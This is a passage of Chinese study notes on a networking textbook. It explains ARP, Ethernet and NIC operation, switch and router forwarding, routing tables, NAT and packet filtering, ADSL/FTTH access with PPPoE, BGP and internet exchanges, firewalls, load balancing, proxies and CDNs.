Protocol，地址解析协议）查询目标路由器的 MAC 地址\n在以太网中，有一种叫作广播的方法，可以把包发给连接在同一以太网中的所有设备。ARP 就是利用广播对所有设备提问。\n如果对方和自己处于同一个子网中，那么通过上面的操作就可以得到对方的 MAC 地址 。然后，我们将这个 MAC 地址写入 MAC 头部，MAC头部就完成了。不过，如果每次发送包都要这样查询一次，网络中就会增加很多 ARP包，因此我们会将查询结果放到一块叫作 ARP 缓存的内存空间中留着以后用。\n以太网的基本知识 ==以太网是一种为多台计算机能够彼此自由和廉价地相互通信而设计的通信技术。==它的原型如图 2.22（a）所示。从图上不难看出，这种网络的本质其实就是一根网线。图上还有一种叫作收发器的小设备，它的功能只是将不同网线之间的信号连接起来而已。因此，当一台计算机发送信号时，信号就会通过网线流过整个网络，最终到达所有的设备。\n这个原型后来变成了图 2.22（b）中的结构。这个结构是将主干网线替换成了一个中继式集线器 ==（集线器）==，将收发器网线替换成了双绞线 。不过，虽然网络的结构有所变化，但信号会发送给所有设备这一基本性质并没有改变。\n后来，图 2.22（c）这样的使用交换式集线器 ==（交换机）== 的结构普及开来，现在我们说的以太网指的都是这样的结构。这个结构看上去和（b）很像，但其实里面有一个重要的变化，即信号会发送给所有设备这一性质变了，现在信号只会流到根据 MAC 地址指定的设备，而不会到达其他设备了。当然，根据MAC 地址来传输包这一点并没有变，因此 MAC 头部的设计也得以保留。\n尽管以太网经历了数次变迁，但其基本的 3 个性质至今仍未改变，==即将包发送到 MAC 头部的接收方 MAC 地址代表的目的地，用发送方 MAC地址识别发送方，用以太类型识别包的内容==。因此，大家可以认为具备这3 个性质的网络就是以太网 。\n将 IP 包转换成电或光信号发送出去 IP 生成的网络包只是存放在内存中的一串数字信息，没有办法直接发送给对方。因此，我们需要将数字信息转换为电或光信号，才能在网线上传输，也就是说，这才是真正的数据发送过程。负责执行这一操作的是网卡。\n有人认为在网卡通电之后，ROM 中的 MAC 地址就自动生效了，其实不然，真正生效的是网卡驱动进行初始化时在 MAC模块中设置的那个 MAC 地址 。在操作系统启动并完成初始化操作之后，网卡就可以等待来自 IP 的委托了。\n网卡的 ROM 中保存着全世界唯一的 MAC 地址，这是在生产网卡时写入的。\n网卡中保存的 MAC 地址会由网卡驱动程序读取并分配给 MAC模块。\n网卡驱动从 IP 模块获取包之后，会将其复制到网卡内的缓冲区中，然后向MAC 模块发送发送包的命令。接下来就轮到 MAC 模块进行工作了。首先，MAC 模块会将包从缓冲区中取出，并在开头加上报头==（不能一开始就发送包的数据，而是要在前面加上一段用来测量时钟信号的特殊信号，这就是报头的作用）==和起始帧分界符==（起始帧分界符是一个用来表示包起始位置的标记）==，在末尾加上用于检测错误的帧校验序列==（来检查包传输过程中因噪声导致的波形紊乱、数据错误）==（图 2.24）。\n报头是一串像 10101010…这样 1 和 0 交替出现的比特序列，长度为 56比特，它的作用是确定包的读取时机。当这些 1010 的比特序列被转换成电信号后，会形成如图 2.25 这样的波形。接收方在收到信号时，遇到这样的波形就可以判断读取数据的时机。关于这一块内容，我们得先讲讲如何通过电信号来读取数据。\n向集线器发送网络包 加上报头、起始帧分界符和 FCS 之后，我们就可以将包通过网线发送出去了（图 2.24）。发送信号的操作分为两种，一种是使用集线器的半双工模式，另一种是使用交换机的全双工模式==（发送和接收同时并行的方式叫作“全双工”，相对地，某一时刻只能进行发送或接收其中一种操作的叫作“半双工”）==。\n==网卡的 MAC 模块生成通用信号，然后由 PHY（MAU）模块转换成可在网线中传输的格式，并通过网线发送出去。==\n接收返回包 PHY（MAU）模块先开始工作， 然后再轮到 MAC 模块。MAC 模块的工作完成了，接下来网卡会通知计算机收到了一个包。\n通知计算机的操作会使用一个叫作中断的机制。在网卡执行接收包的操作的过程中，==计算机并不是一直监控着网卡的活动==，而是去继续执行其他的任务。因此，==如果网卡不通知计算机，计算机是不知道包已经收到了这件事的==。网卡驱动也是在计算机中运行的一个程序，因此它也不知道包到达的状态。在这种情况下，我们==需要一种机制能够打断计算机正在执行的任务，让计算机注意到网卡中发生的事情，这种机制就是中断==。\n具体来说，中断的工作过程是这样的。首先，网卡向扩展总线中的中断信号线发送信号，该==信号线通过计算机中的中断控制器连接到 CPU==。当产生中断信号时，CPU 会暂时挂起正在处理的任务，切换到操作系统中的中断处理程序 。然后，==中断处理程序会调用网卡驱动，控制网卡执行相应的接收操作==。\n网卡驱动被中断处理程序调用后，会从网卡的缓冲区中取出收到的包，并通过 MAC 头部中的以太类型字段判断协议的类型。\n假设 Web 服务器返回了一个网络包，服务器返回的包的以太类型应该是 0800，因此网卡驱动会将其交给 TCP/IP 协议栈来进行处理。\n接下来轮到 IP 模块工作，进行==查看接收方 IP 地址==等操作。\n接下来包会被交给 TCP 模块。TCP模块会根据 IP 头部中的接收方和发送方 IP 地址，以及 ==TCP 头部中的接收方和发送方端口号==来查找对应的套接字。找到对应的套接字之后，就可以根据套接字中记录的通信状态，执行相应的操作了。例如，如果包的内容是应用程序数据，则返回确认接收的包，并将数据放入缓冲区，等待应用程序来读取；如果是建立或断开连接的控制包，则返回相应的响应控制包，并告知应用程序建立和断开连接的操作状态。\n2.6 UDP 协议的收发操作 TCP 的工作方式十分复杂，为什么要设计得如此复杂呢？因为我们需要将数据高效且可靠地发送给对方。为了实现可靠性，我们就需要确认对方是否收到了我们发送的数据，如果没有还需要再发一遍。\n适合使用 UDP的情况：\n==不需要重发的数据==\n==控制用的短数据==：像 DNS 查询等交换控制信息的操作基本上都可以在一个包的大小范围内解决，这种场景中就可以用 UDP 来代替TCP\n==音频和视频数据==：音频和视频数据必须在规定的时间内送达，一旦送达晚了，就会错过播放时机，导致声音和图像卡顿\n第3章　从网线到网络设备——探索集线器、交换机和路由器 3.1 信号在网线和集线器中传输 每个包都是独立传输的\n从计算机发送出来的网络包会通过集线器、路由器等设备被转发，最终到达目的地。==转发设备会根据包头部中的控制信息==，在转发设备内部一个写有转发规则的表中进行查询，以此来判断包的目的地，然后将包朝目的地的方向进行转发。无论包里面装的是应用程序的数据或者是 TCP 协议的控制信息 ，都不会对包的传输操作本身产生影响。因此，所有的包在传输到目的地的过程中都是独立的，相互之间没有任何关联。\n“双绞”是为了抑制噪声\n局域网网线使用的是双绞线，其中“双绞”的意思就是以两根信号线\n为一组缠绕在一起，这种拧麻花一样的设计是为了抑制噪声的影响。\n集线器将信号发往所有线路\n当信号到达集线器后，会被广播到整个网络中。以太网的基本架构就是将包发到所有的设备，然后由设备根据接收方 MAC 地址来判断应该接收哪些包，而集线器就是这一架构的忠实体现，它就是负责按照以太网的基本架构将信号广播出去。\n3.2 交换机的包转发操作 交换机根据地址表进行转发\n交换机的设计是将网络包原样转发到目的地。\n大家可以认为交换机的每个网线接口后面都是一块网卡。网线接口和后面的电路部分加在一起称为一个端口，也就是说交换机的一个端口就相当于计算机上的一块网卡 。但交换机的工作方式和网卡有一点不同。网卡本身具有 MAC 地址，并通过核对收到的包的接收方 MAC 地址判断是不是发给自己的，如果不是发给自己的则丢弃；相对地，交换机的端口不核对接收方 MAC 地址，而是直接接收所有的包并存放到缓冲区中。因此，和网卡不同，==交换机的端口不具有 MAC 地址==。\n换句话说，如果在计算机上安装多块网卡，并开启“混杂模式”让网卡接收所有的网络包，然后再安装一个和交换机具备同样功能的网络包转发软件，那么这台计算机就变成了一台交换机。\n将包存入缓冲区后，接下来需要查询一下这个包的接收方 MAC 地址是否已经在 MAC 地址表中有记录了。MAC 地址表主要包含两个信息，一个是设备的 MAC 地址，另一个是该设备连接在交换机的哪个端口上。以 图 3.7 中的地址表为例，MAC 地址和端口是一一对应的，通过这张表就能够判断出收到的包应该转发到哪个端口。举个例子，如果收到的包的接收方 MAC 地址为 00-02-B3-1C-9C-F9，则与图 3.7 的表中的第 3 行匹配，根据端口列的信息，可知这个地址位于 8 号端口上，然后就可以通过交换电路将包发送到相应的端口了。\n交换机根据 MAC 地址表查找 MAC 地址，然后将信号发送到相应的端口。\n如果接收方 MAC 地址是一个广播地址 ，那么交换机会将包发送到除源端口之外的所有端口。\n广播地址（broadcast address）是一种特殊的地址，将广播地址设为接收方地址时，包会发送到网络中所有的设备。MAC 地址中的 FF:FF:FF:FF:FF:FF和 IP 地址中的 255.255.255.255 都是广播地址。\n交换机的全双工模式可以同时发送和接收信号。\n交换机可同时执行多个转发操作\n==交换机只将包转发到具有特定 MAC 地址的设备连接的端口，其他端口都是空闲的。==如图 3.7 中的例子所示，当包从最上面的端口发送到最下面的端口时，其他端口都处于空闲状态，这些端口可以传输其他的包，因此交换机可以同时转发多个包。\n==相对地，集线器会将输入的信号广播到所有的端口，如果同时输入多个信号就会发生碰撞==，无法同时传输多路信号，因此从设备整体的转发能力来看，交换机要高于集线器。\n3.3 路由器的包转发操作 路由器的基本知识 网络包经过集线器和交换机之后，现在到达了路由器，并在此被转发到下一个路由器。这一步转发的工作原理和交换机类似，也是通过查表判断包转发的目标。不过在具体的操作过程上，路由器和交换机是有区别的。因为==路由器是基于 IP 设计的，而交换机是基于以太网设计的== 。\n其中转发模块负责判断包的转发目的地，端口模块负责包的收发操作。换句话说，路由器转发模块和端口模块的关系，就相当于协议栈的 IP 模块和网卡之间的关系。因此，大家可以将==路由器的转发模块想象成 IP 模块，将端口模块想象成网卡。==\n路由器的各个端口都具有 MAC 地址和 IP 地址。\n路由表中的信息 路由器根据“IP 地址”判断转发目标。\n最左侧的目标地址列记录的是接收方的信息。这里可能不是很容易理解，实际上这里的 IP 地址只包含表示子网的网络号部分的比特值，而表示主机号部分的比特值全部为 0。路由器会将接收到的网络包的接收方 IP地址与路由表中的目标地址进行比较，并找到相应的记录。==交换机在地址表中只匹配完全一致的记录，而路由器则会忽略主机号部分，只匹配网络号部分。打个比方，路由器在转发包的时候只看接收方地址属于哪个区，×× 区发往这一边，×× 区发往那一边。==在匹配地址的过程中，路由器需要知道网络号的比特数，因此路由表中还有一列子网掩码。子网掩码的含义和第 1 章的图 1.9（b）中介绍的子网掩码基本相同，通过这个值就可以判断出网络号的比特数。\n路由器会忽略主机号，只匹配网络号。\n目标地址列中的 IP 地址表示的是子网，但也有一些例外，有时地址本身的子网掩码和路由表中的子网掩码是不一致的，这是路由聚合的结果。\n现在有 3 个子网，分别为10.10.1.0/24、10.10.2.0/24、10.10.3.0/24，路由器 B 需要将包发往这 3 个子网。在这种情况下，路由器 B 的路由表中原本应该有对应这 3 个子网的 3条记录，但在这个例子中，无论发往任何一个子网，都是通过路由器 A 来进行转发，因此我们可以在路由表中将这 3 个子网合并成 ==10.10.0.0/16==，这样也可以正确地进行转发，但我们减少了路由表中的记录数量，这就是路由聚合。经过路由聚合，多个子网会被合并成一个子网，子网掩码会发生变化，同时，目标地址列也会改成聚合后的地址。\n路由表的子网掩码列只表示在匹配网络包目标地址时需要对比的比特数量。\n路由器的端口都具有 MAC 地址，只接收与自身地址匹配的包，遇到不匹配的包则直接丢弃。\n查询路由表确定输出端口 完成包接收操作之后，路由器就会丢弃包开头的 MAC 头部。MAC 头部的作用就是将包送达路由器，==其中的接收方 MAC 地址就是路由器端口的 MAC 地址==。因此，当包到达路由器之后，MAC 头部的任务就完成了，于是 MAC 头部就会被丢弃。\n接下来，路由器会根据 MAC 头部后方的 IP 头部中的内容进行包的转发操作。转发操作分为几个阶段，首先是查询路由表判断转发目标。关于具体的工作过程，我们还是来看一个实际的例子，如图 3.13 的情况，假设地址为 10.10.1.101 的计算机要向地址为 192.168.1.10 的服务器发送一个包， 这个包先到达图中的路由器。判断转发目标的第一步，就是根据包的接收方 IP 地址查询路由表中的目标地址栏，以找到相匹配的记录。就像前面讲 过的一样，这个匹配并不是匹配全部 32 个比特，而是根据子网掩码列中的值判断网络号的比特数，并匹配相应数量的比特 。例如，图 3.13 的第 3 行，==子网掩码列为 255.255.255.0，就表示需要匹配从左起 24 个比特==。网络包的接收方 IP 地址和路由表中的目标地址左起 24 个比特的内容都是192.168.1，因此两者是匹配的，该行记录就是候选转发目标之一。\n按照这样的规则，我们可能会匹配到多条候选记录。在这个例子中， 第 3、4、5 行都可以匹配 。其中，==路由器首先寻找网络号比特数最长的一条记录== 。==网络号比特数越长，说明主机号比特数越短，也就意味着该子网内可分配的主机数量越少==，即子网中可能存在的主机数量越少，这一规则的目的是尽量缩小范围，所以根据这条记录判断的转发目标就会更加准确。我们来看图 3.13 中的例子。\n第 3 行 192.168.1.0/255.255.255.0 表示一个子网，第 4 行192.168.1.10/ 255.255.255.255 表示一台服务器。相比服务器所属的子网来说，直接指定服务器本身的地址时范围更小，因此这里应该选择第 4 行作为转发目标。按照最长匹配原则筛选后，如果只剩一条候选记录，则按照这条记录的内容进行转发。\n然而，有时候路由表中会存在网络号长度相同的多条记录，例如考虑到路由器或网线的故障而设置的备用路由就属于这种情况。这时，需要根据跃点计数的值来进行判断。==跃点计数越小说明该路由越近，因此应选择跃点计数较小的记录==。\n找不到匹配路由时选择默认路由\n图 3.13 路由表中的最后一行的作用就相当于把所有目标都配置好了。这一行的子网掩码为 0.0.0.0，关键就在这里，子网掩码 0.0.0.0 的意思是网络包接收方 IP 地址和路由表目标地址的匹配中需要匹配的比特数为 0，换句话说，就是根本不需要匹配。只要将子网掩码设置为 0.0.0.0，那么无论任何地址都能匹配到这一条记录，这样就不会发生不知道要转发到哪里的问题了。\n==只要在这一条记录的网关列中填写接入互联网的路由器地址，当匹配不到其他路由时 ，网络包就会被转发到互联网接入路由器。==因此这条记录被称为默认路由，这一行配置的网关地址被称为默认网关。在计算机的TCP/IP 设置窗口中也有一个填写默认网关的框，意思是一样的。计算机上也有一张和路由器一样的路由表，其中默认网关的地址就是我们在设置窗口中填写的地址。\n路由表中子网掩码为 0.0.0.0 的记录表示“默认路由”。\n这样一来，无论目标地址是表示一个子网还是表示某台设备，都可以用相同的方法查找出转发目标，而且也避免了不知道转发到哪里的问题。\n什么是子网掩码？\n路由器判断下一个转发目标的方法如下：\n如果路由表的网关列内容为 IP 地址，则该地址就是下一个转发目标。 如果路由表的网关列内容为空，则 IP 头部中的接收方 IP 地址就是下一个转发目标。 路由器也会使用 ARP 来查询下一个转发目标的 MAC 地址。\n路由器与交换机的关系 图 3.16可以发现，准确的说法应该是==将 IP 包装进以太网包的数据部分中==。也就是说，==给包加上 MAC 头部并发送，从本质上说是将 IP 包装进以太网包的数据部分中，委托以太网去传输这些数据。IP 协议本身没有传输包的功能，因此包的实际传输要委托以太网来进行。路由器是基于 IP 设计的，而交换机是基于以太网设计的，因 此 IP 与以太网的关系也就是路由器与交换机的关系。换句话说，路由器将包的传输工作委托给交换机来进行== 。\n==IP（路由器）负责将包送达通信对象这一整体过程，而其中将包传输到下一个路由器的过程则是由以太网（交换机）来负责的==。\n3.4 路由器的附加功能 通过地址转换有效利用 IP 地址 路由器除了这些基本功能之外，还有一些附加功能。下面介绍两种最重要的功能——==地址转换==和==包过滤==\n首先，我们先了解一下地址转换功能出现的背景。所谓地址，就是用来识别每一台设备的标志，因此每台设备都应该有一个唯一不重复的地址。如果不能保证每台设备有唯一不重复的地址，就会从根本上影响网络包的传输，这是一个非常严重的问题。如果任由这样发展下去，不久的将来，一旦固定地址用光，新的设备就无法接入了，互联网也就无法继续发展了。\n解决这个问题的关键在于==固定地址的分配方式==。举个例子，假如有 A、 B 两家公司，它们的内网是完全独立的。这种情况下，两家公司的内网之间不会有网络包流动，即使 A 公司的某台服务器和 B 公司的某台客户端具有相同的 IP 地址也没关系，因为它们之间不会进行通信。只要在每家公司自己的范围内，能够明确判断网络包的目的地就可以了，是否和其他公司的内网地址重复无关紧要，只要每个公司的网络是相互独立的，就不会出现问题。\n解决地址不足的问题，利用的就是这样的性质，即公司内部设备的地址不一定要和其他公司不重复。这样一来，公司内部设备就不需要分配固定地址了，从而大幅节省了 IP 地址。当然，就算是公司内网，也不是可以随便分配地址的，因此需要设置一定的规则，==规定某些地址是用于内网的，这些地址叫作私有地址，而原来的固定地址则叫作公有地址==。\n在内网中可用作私有地址的范围仅限以下这些。\n在制定私有地址规则时，这些地址属于公有地址中还没有分配的范围。这个范围中的地址和其他公司重复也没关系，所以对于这些地址不作统一管理，不需要申请，任何人都可以自由使用。当然，如果在公司内部地址有重复就无法传输网络包了，因此必须避免在内网中出现重复的地址。\n尽管这样的确能节省一部分地址，但仅凭这一点还无法完全解决问题。公司内网并不是完全独立的，而是需要通过互联网和其他很多公司相连接，所以当内网和互联网之间需要传输包的时候，问题就出现了，因为如果很多地方都出现相同的地址，包就无法正确传输了。于是，当公司内网和互联网连接的时候，需要采用图 3.17 这样的结构，即==将公司内网分成两个部分，一部分是对互联网开放的服务器，另一部分是公司内部设备==。其中==对互联网开放的部分分配公有地址==，可以和互联网直接进行通信，这一部分和之前介绍的内容是一样的。相对地，==内网部分则分配私有地址==，内网中的设备不能和互联网直接收发网络包，而是通过一种特别的机制进行连接，这个机制就叫==地址转换==。\n地址转换的基本原理 ==地址转换的基本原理是在转发网络包时对 IP 头部中的 IP 地址和端口号 进行改写。==\n改写端口号的原因 早期的地址转换机制是只改写地址，不改写端口号的。但是，使用这种方法的前提是私有地址和公有地址必须一一对应，也就是说，有多少台设备要上互联网，就需要多少个公有地址。一个几千人的公司里，有几百人同时访问互联网是很正常的，这样就需要几百个公有地址。\n改写端口号正是为了解决这个问题。客户端一方的端口号本来就是从空闲端口中随机选择的，因此改写了也不会有问题。端口号是一个 16 比特的数值，总共可以分配出几万个端口 A，因此如果用公有地址加上端口的组合对应一个私有地址，一个公有地址就可以对应几万个私有地址，这种方法提高了公有地址的利用率。\n从互联网访问公司内网 对于从互联网访问公司内网的包，如果在对应表中没有记录就无法正常转发。因为如果对应表中没有记录，就意味着地址转换设备无法判断公有地址与私有地址之间的对应关系。\n之所以无法从互联网访问内网，是因为对应表里没有相应的记录，那么我们只要事先手动添加这样的记录就可以了（图 3.19）。一般来说，用于外网访问的服务器可以放在地址转换设备的外面并为它分配一个公有地址，也可以将服务器的私有地址手动添加到地址转换设备中，这样就可以从互联网访问到这台具有私有地址的服务器了。\n路由器的包过滤功能 包过滤就是在对包进行转发时，根据 MAC 头部、IP 头部、TCP 头部的内容，按照事先设置好的规则决定是转发这个包，还是丢弃这个包。我们通常说的防火墙设备或软件，大多数都是利用这一机制来防止非法入侵的。\n第4章　通过接入网进入互联网内部——探索接入网和网络运营商 4.1 ADSL 接入网的结构和工作方式 所谓接入网，就是指连接互联网与家庭、公司网络的通信线路 。一般家用的接入网方式包括 ADSLB、FTTH、CATV、电话线、ISDN 等，公司则还可能使用专线。\nADSL：Asymmetric Digital Subscriber Line，不对称数字用户线。它是一种利用架设在电线杆上的金属电话线来进行高速通信的技术，它的上行方向（用户到互联网）和下行方向（互联网到用户）的通信速率是不对称的。\nFTTH：Fiber To The Home，光纤到户。指的是将光纤接入家庭的意思。\nADSL Modem（Modem：调制解调器）\nBAS：Broadband Access Server，宽带接入服务器。它也是一种路由器。\nPPP：Point-to-Point Protocol，点到点协议。它是电话线、ISDN 等通信线路所使用的一种协议，集成了用户认证、配置下发、数据压缩、加密等各种功能。\nATM：Asynchronous Transfer Mode，异步传输。它是在以电话线为载体的传统电话技术基础上扩展出来的一种通信方式。它的数据传输是以“信元”为单位来进行的，这和以包为单位传输数据的 TCP/IP 很像，但这种方式并不适用于计算机通信。\nDSLAM：DSL Access Multiplexer，数字用户线接入复用设备。它是一种电话局用的多路 ADSL Modem，可以理解为将多个 ADSL Modem 整合在一个外壳里的设备。\nPPPoE：Point-to-Point Protocol over Ethernet，以太网的点对点协议。\nPPPoA：Point-to-Point Protocol over ATM。\n互联网接入路由器会在网络包前面加上 MAC 头部、PPPoE 头部、PPP 头 部 总 共 3 种 头 部， 然 后 发 送 给 ADSL Modem（PPPoE 方式下）。\nADSL Modem 将包拆分成信元，并转换成电信号发送给分离器。\n==分离器的作用==：ADSL Modem 将信元转换为电信号之后，信号会进入一个叫作分离器的设备，然后 ADSL 信号会和电话的语音信号混合起来一起从电话线传输出去。在信号从用户端发送出去时，电话和 ADSL 信号只是同时流到一条线路上而已，分离器实际上并没有做什么事。分离器的作用其实在相反的方向，也就是信号从电话线传入的时候。这时，分离器需要负责将电话和 ADSL 的信号进行分离（图 4.7）。电话线传入的信号是电话的语音信号和 ADSL 信号混合在一起的，如果这个混合信号直接进入电话机，ADSL 信号就会变成噪音，导致电话难以听清。为了避免这样的问题，就需要通过分离器将传入的信号分离，以确保 ADSL信号不会传入电话机。\nDSLAM 具有 ATM 接口，和后方路由器收发数据时使用的是原始网络包拆分后的 ATM 信元形式。\nBAS 负责将 ATM 信元还原成网络包并转发到互联网内部。\n4.2 光纤接入网（FTTH） 用光纤来代替 ADSL 将用户端接入路由器和运营商的 BAS 连接起来的接入方式就是 ==FTTH==。FTTH 可以分为直连和分路两种方式，这两种方式只是光信号的传输方式有一些区别，实际传输的网络包是相同的。当使用 PPPoE 来传输包时，其工作过程和刚才讲过的 ADSL 类似。具体来说，就是像图4.3 中的⑤一样，由互联网接入路由器在 IP 头部前面加上 MAC 头部、PPPoE 头部和 PPP 头部，然后由光纤收发器或者 ONU 转换成光信号 D，并通过光纤到达 BAS 前面的多路光纤收发器和 OLT，最后被还原成电信号并到达 BAS。\n4.3 接入网中使用的 PPP 和隧道 用户发送的网络包会通过 ADSL 和 FTTH 等接入网到达运营商的BAS。\n互联网本来就是由很多台路由器相互连接组成的，因此原则上应该是将接入网连接到路由器上。随着接入网发展到 ADSL 和 FTTH，接入网连接的路由器也跟着演进，而这种进化型的路由器就叫作 BAS。\n首先是==用户认证和配置下发功能==。ADSL 和 FTTH 接入网中，都需要先输入用户名和密码 ，登录之后才能访问互联网，而 BAS 就是登录操作的窗口。BAS 使用 PPPoE 方式来实现这个功能 。PPPoE 是由传统电话拨号上网上使用的 PPP 协议发展而来的。\nPPPoE 是将 PPP 消息装入以太网包进行传输的方式。\nBAS 除了作为用户认证的窗口之外，还可以==使用隧道方式来传输网络包==。所谓隧道，就类似于套接字之间建立的 TCP 连接。在 TCP 连接中，我们从一侧的出口（套接字）放入数据，数据就会原封不动地从另一个出口出来，隧道也是如此。也就是说，我们将包含头部在内的整个包从隧道的一头扔进去，这个包就会原封不动地从隧道的另一头出来。\n接入网的整体工作过程 互联网接入路由器通过 PPPoE 的发现机制查询 BAS 的 MAC 地址。\nBAS 下发的 TCP/IP 参数会被配置到互联网接入路由器的 BAS端的端口上，这样路由器就完成接入互联网的准备了。\nBAS 在收到用户路由器发送的网络包之后，会去掉 MAC 头部和PPPoE 头部，然后用隧道机制将包发送给网络运营商的路由器。\n除 PPPoE 之外的其他方式 实际的接入网还有其他一些方式。\n使用==PPPoA== 方式的 ADSL 接入网（PPPoA 不能用于 FTTH，因为 FTTH 不使用 ATM 信元）。PPPoA 方式不添加 MAC 头部和 PPPoE 头部，而是直接将包装入信元中。\n还有一种 ==DHCP== 方式，它不使用 PPP，而是将以太网包直接转换成 ADSL 信号发送给 DSLAM。采用 DHCP 的运营商使用的 ADSL Modem 也和 PPPoE、PPPoA方式不同，这种 ADSL Modem 不使用信元，而是直接将以太网包调制成ADSL 信号，因此没有 ADSL Modem 和路由器无法分离的问题（使用信元的 PPPoE 和 PPPoA 方式中，BAS 需要配备比较昂贵的 ATM 接口，因此不使用信元还可以控制成本）。\n4.4 网络运营商的内部 现在网络包已经通过接入网，到达了网络运营商的路由器。这里是互联网的入口，网络包会从这里进入互联网内部\n互联网的实体并不是由一个组织运营管理的单一网络，而是由多个运营商网络相互连接组成的（图 4.23）。ADSL、FTTH 等接入网是与用户签约的运营商设备相连的，这些设备称为==POP（POP：Point of Presense，中文一般叫作“接入点”）==，互联网的入口就位于这里。\n==网络包通过接入网之后，到达运营商 POP 的路由器。==\n==NOC（NOC：Network Operation Center，网络运行中心）== 是运营商的核心设备，从 POP 传来的网络包都会集中到这里，并从这里被转发到离目的地更近的 POP，或者是转发到其他的运营商。这里也需要配备高性能的路由器。\n4.5 跨越运营商的网络包 只要让相连的路由器告知路由信息就可以了。只要获得了对方的路由信息，就可以知道对方路由器连接的所有网络，将这些信息写入自己的路由表中，也就可以向那些网络发送包了。\n获得对方的路由信息之后，我们也需要将自身的路由信息告知对方。这样一来，对方也可以将发往我们所在子网的包转发过来。这个路由信息交换的过程是由路由器自动完成的，这里使用的机制称为 ==BGP（BGP：Border Gateway Protocol，边界网关协议）==。\n==互联网内部使用 BGP 机制在运营商之间交换路由信息。==\n根据所告知的路由信息的内容，这种路由交换可分为两类。一类是将互联网中的路由全部告知对方。例如图 4.26 中，如果运营商 D 将互联网上所有路由都告知运营商 E，则运营商 E 不但可以访问运营商 D，还可以访问运营商 D 后面的运营商 B、A 和 C。然后，通过运营商 D 就可以向所有的运营商发送包。像这样，通过运营商 D 来发送网络包的方式称为==转接==。\n另一种类型是两个运营商之间仅将与各自网络相关的路由信息告知对方。这样，只有双方之间的网络可以互相收发网络包，这种方式称为非转接，也叫==对等== 。\nIX 的必要性 图 4.26 中有一个叫作==IX（IX：Internet eXchange，中文一般叫作“互联网交换中心”）==的东西，我们来说说它是干什么用的。对于两个运营商来说，像图 4.26 中运营商 D 和运营商 C 这样一对一的连接是最基本的一种连接方式，现在也会使用这种方式。但这种方式有个不方便的地方，如果运营商之间只能一对一连接，那么就需要像图 4.27（a）这样将所有的运营商都用通信线路连接起来。现在光日本国内就有数千家运营商，这样连接非常困难。对于这种情况，我们可以采用图 4.27（b）的方式，设置一个中心设备，通过连接到中心设备的方式来减少线路数量，这个中心设备就称为 IX。\n运营商如何通过 IX 互相连接 第5章　服务器端的局域网中有什么玄机 5.1 Web 服务器的部署地点 5.2 防火墙的结构和原理 防火墙的基本思路：即==只允许发往特定服务器中的特定应用程序的包通过，然后屏蔽其他的包==。\n==包过滤方式的防火墙可根据接收方 IP 地址、发送方 IP 地址、接收方端口号、发送方端口号、控制位等信息来判断是否允许某个包通过。==\n5.3 通过将请求平均分配给多台服务器来平衡负载 ==性能不足时需要负载均衡==，使用多台服务器来分担负载的方法，这种架构统称为==分布式架构==。\n其中对于负载的分担有几种方法，最简单的一种方法就是采用多台 Web 服务器，减少每台服务器的访问量。假设现在我们有 3 台服务器，那么每台服务器的访问量会减少到三分之一，负载也就减轻了。要采用这样的方法，必须有一个机制将客户端发送的请求分配到每台服务器上。\n==通过 DNS 服务器来分配：轮询（round-robin）==\n==使用负载均衡器分配访问==\n用负载均衡器时，首先要用负载均衡器的 IP 地址代替 Web 服务器的实际地址注册到 DNS 服务器上。假设有一个域名 www.lab.glasscom.com，==我们将这个域名对应的 IP 地址设置为负载均衡器的 IP 地址并注册到 DNS 服务器上。于是，客户端会认为负载均衡器就是一台 Web 服务器==，并向其发送请求，然后由负载均衡器来判断将请求转发给哪台 Web 服务器（图 5.4）。\n5.4 使用缓存服务器分担负载 除了使用多台功能相同的 Web 服务器分担负载之外，还有另外一种方法，就是将整个系统按功能分成不同的服务器 ，如 Web 服务器、数据库服务器。==缓存服务器就是一种按功能来分担负载的方法==。缓存服务器是一台通过代理机制对数据进行缓存的服务器。代理介于Web 服务器和客户端之间，具有对 Web 服务器访问进行中转的功能。当进行中转时，它可以将 Web 服务器返回的数据保存在磁盘中，并可以代替Web 服务器将磁盘中的数据返回给客户端。这种保存的数据称为缓存，缓存服务器指的也就是这样的功能。\n正向代理和反向代理 **正向代理，是\u0026quot;代理服务器\u0026quot;代理了\u0026quot;客户端\u0026quot;，去和\u0026quot;目标服务器\u0026quot;进行交互。**通过正向代理服务器访问目标服务器，目标服务器是不知道真正的客户端是谁的。\n**反向代理，是\u0026quot;代理服务器\u0026quot;代理了\u0026quot;目标服务器\u0026quot;，去和\u0026quot;客户端\u0026quot;进行交互。**通过反向代理服务器访问目标服务器时，客户端是不知道真正的目标服务器是谁的。\n正向代理和反向代理的区别 虽然正向代理服务器和反向代理服务器所处的位置都是客户端和真实服务器之间，所做的事情也都是把客户端的请求转发给服务器，再把服务器的响应转发给客户端，但是二者之间还是有一定的差异的。\n1、正向代理其实是客户端的代理，帮助客户端访问其无法访问的服务器资源。反向代理则是服务器的代理，帮助服务器做负载均衡，安全防护等。\n2、正向代理一般是客户端架设的，比如在自己的机器上安装一个代理软件。而反向代理一般是服务器架设的，比如在自己的机器集群中部署一个反向代理服务器。\n3、正向代理中，服务器不知道真正的客户端到底是谁，以为访问自己的就是真实的客户端。而在反向代理中，客户端不知道真正的服务器是谁，以为自己访问的就是真实的服务器。\n4、正向代理和反向代理的作用和目的不同。正向代理主要是用来解决访问限制问题。而反向代理则是提供负载均衡、安全防护等作用。二者均能提高访问速度。\n5.5 内容分发服务 利用内容分发服务分担负载 作为一个 Web 服务器运营者，如果自己和这些运营商签约并部署缓存服务器，无论是费用还是精力都是吃不消的。为了解决这个问题，一些专门从事相关服务的厂商出现了，他们来部署缓存服务器，并租借给 Web 服务器运营者。这种服务称为==内容分发服务==。\n提供这种服务的厂商称为 CDSPB，他们会与主要的供应商签约，并部署很多台缓存服务器 C。另一方面，CDSP 会与 Web 服务器运营者签约，使 得 CDSP 的缓存服务器配合 Web 服务器工作。只要 Web 服务器与缓存服务器建立关联，那么当客户端访问 Web 服务器时，实际上就是在访问 CDSP 的缓存服务器了。\n缓存服务器可以缓存多个网站的数据，因此 CDSP 的缓存服务器就可以提供给多个 Web 服务器的运营者共享。这样一来，每个网站运营者的平均成本就降低了，从而减少了网站运营者的负担。而且，和运营商之间的签约工作也由 CDSP 统一负责，网站运营者也节省了精力。\n内容分发服务也叫 CDS（Content Delivery Service）。（现在更常用的名称叫 CDN（Content Delivery Network 或 Content Distribution Network）。 CDSP：Content Delivery Service Provider，内容分发服务运营商。\n如何找到最近的缓存服务器 第6章　请求到达Web服务器，响应返回浏览器——短短几秒的“漫长旅程”迎来终点 6.1 服务器概览 